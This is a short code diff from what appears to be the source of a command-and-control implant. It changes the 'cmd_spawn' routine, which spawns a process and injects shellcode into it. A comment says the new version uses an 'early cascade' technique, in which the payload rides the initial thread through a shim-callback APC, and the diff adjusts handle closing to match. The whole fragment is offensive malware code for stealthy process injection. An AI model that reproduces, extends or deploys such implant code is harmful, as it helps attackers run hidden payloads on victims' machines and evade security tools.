@@ -62,7 +62,7 @@ VOID cmd_spawn(PINSTANCE inst, PPARSER args, PPACKAGE response) {
         return;
     }
 
-    HANDLE hThread = inject_shellcode_into(inst, pi.hProcess, sc, sc_len, NULL);
+    HANDLE hThread = inject_shellcode_into(inst, pi.hProcess, pi.hThread, sc, sc_len, NULL);
     if (!hThread) {
         inst->Win32.TerminateProcess(pi.hProcess, 1);
         gate_CloseHandle(inst, pi.hThread);
@@ -72,7 +72,10 @@ VOID cmd_spawn(PINSTANCE inst, PPARSER args, PPACKAGE response) {
         return;
     }
 
-    gate_CloseHandle(inst, hThread);
+    // early cascade returns the initial thread handle itself (the payload
+    // rides it via the shim-callback APC) - do not close it twice
+    if (hThread != pi.hThread)
+        gate_CloseHandle(inst, hThread);
     gate_CloseHandle(inst, pi.hThread);
     gate_CloseHandle(inst, pi.hProcess);
 
